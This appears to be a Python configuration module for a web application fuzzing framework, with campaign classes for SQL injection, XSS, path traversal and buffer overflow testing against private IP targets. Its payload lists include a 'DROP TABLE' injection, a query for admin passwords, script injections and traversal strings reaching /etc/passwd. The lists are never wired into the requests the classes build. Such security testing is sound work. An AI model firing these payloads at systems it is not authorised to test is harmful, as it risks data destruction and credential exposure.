#!/usr/bin/env python3
"""
Configuration Template: Web Application Fuzzing

Reusable configuration classes for web application security testing.
Import these base classes to create consistent web app fuzzing campaigns.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from fuzzing_framework import FuzzingCampaign, FuzzField
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

class WebAppBaseCampaign(FuzzingCampaign):
    """Base configuration for web application fuzzing."""
    
    # Common web app settings
    rate_limit = 2.0  # Conservative rate limiting
    capture_responses = True
    verbose = True
    
    # Web-specific ports
    HTTP_PORTS = [80, 8080, 8000, 3000, 9000]
    HTTPS_PORTS = [443, 8443, 8000, 9443]
    
    # Common HTTP methods
    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
    
    # Attack payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM admin --",
        "1' AND 1=1 --",
        "admin'--",
        "' OR 1=1#"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>"
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    
    def create_http_request(self, method="GET", path="/", host="target.com", 
                           headers=None, body=None):
        """Create a standard HTTP request."""
        if headers is None:
            headers = {}
        
        # Basic headers
        default_headers = {
            "Host": host,
            "User-Agent": "Mozilla/5.0 (compatible; SecurityTester/1.0)",
            "Accept": "*/*",
            "Connection": "close"
        }
        default_headers.update(headers)
        
        # Build request
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in default_headers.items()])
        
        if body:
            content_length = len(body.encode() if isinstance(body, str) else body)
            request = f"{request_line}{header_lines}\r\nContent-Length: {content_length}\r\n\r\n"
            if isinstance(body, str):
                request += body
            else:
                request = request.encode() + body
        else:
            request = f"{request_line}{header_lines}\r\n\r\n"
        
        return request.encode() if isinstance(request, str) else request

class SQLInjectionCampaign(WebAppBaseCampaign):
    """SQL Injection testing campaign."""
    name = "SQL Injection Testing"
    iterations = 15
    
    def __init__(self, target_host="192.168.1.100", target_port=80):
        super().__init__()
        self.target = target_host
        
        # Create packet with SQL injection payloads
        base_request = self.create_http_request(
            method="GET", 
            path="/search?q=test",
            host=target_host
        )
        
        self.packet = IP(dst=target_host) / TCP(dport=target_port) / Raw(load=base_request)

class XSSCampaign(WebAppBaseCampaign):
    """Cross-Site Scripting testing campaign."""
    name = "XSS Testing"
    iterations = 12
    
    def __init__(self, target_host="192.168.1.100", target_port=80):
        super().__init__()
        self.target = target_host
        
        # Create packet with XSS payloads
        base_request = self.create_http_request(
            method="GET",
            path="/comment?text=hello",
            host=target_host
        )
        
        self.packet = IP(dst=target_host) / TCP(dport=target_port) / Raw(load=base_request)

class PathTraversalCampaign(WebAppBaseCampaign):
    """Path traversal testing campaign."""
    name = "Path Traversal Testing"
    iterations = 10
    
    def __init__(self, target_host="192.168.1.100", target_port=80):
        super().__init__()
        self.target = target_host
        
        # Create packet with path traversal payloads
        base_request = self.create_http_request(
            method="GET",
            path="/download?file=document.pdf",
            host=target_host
        )
        
        self.packet = IP(dst=target_host) / TCP(dport=target_port) / Raw(load=base_request)

class BufferOverflowCampaign(WebAppBaseCampaign):
    """Buffer overflow testing campaign."""
    name = "Buffer Overflow Testing"
    iterations = 8
    
    def __init__(self, target_host="192.168.1.100", target_port=80):
        super().__init__()
        self.target = target_host
        
        # Create packet with various buffer sizes
        long_payload = "A" * 5000
        base_request = self.create_http_request(
            method="POST",
            path="/upload",
            host=target_host,
            body=long_payload
        )
        
        self.packet = IP(dst=target_host) / TCP(dport=target_port) / Raw(load=base_request)

# Example usage configurations
WEBAPP_CONFIGS = {
    'sql_injection': SQLInjectionCampaign,
    'xss': XSSCampaign,
    'path_traversal': PathTraversalCampaign,
    'buffer_overflow': BufferOverflowCampaign
}

def create_webapp_campaign(attack_type, target_host="192.168.1.100", target_port=80):
    """Factory function to create web app campaigns."""
    if attack_type not in WEBAPP_CONFIGS:
        raise ValueError(f"Unknown attack type: {attack_type}")
    
    campaign_class = WEBAPP_CONFIGS[attack_type]
    return campaign_class(target_host, target_port)

if __name__ == "__main__":
    print("=== Web Application Configuration Templates ===")
    print("Available attack types:")
    for attack_type in WEBAPP_CONFIGS.keys():
        print(f"  - {attack_type}")
    print()
    print("Usage:")
    print("  from config.webapp_config import create_webapp_campaign")
    print("  campaign = create_webapp_campaign('sql_injection', '192.168.1.100')")
    print("  campaign.execute()")
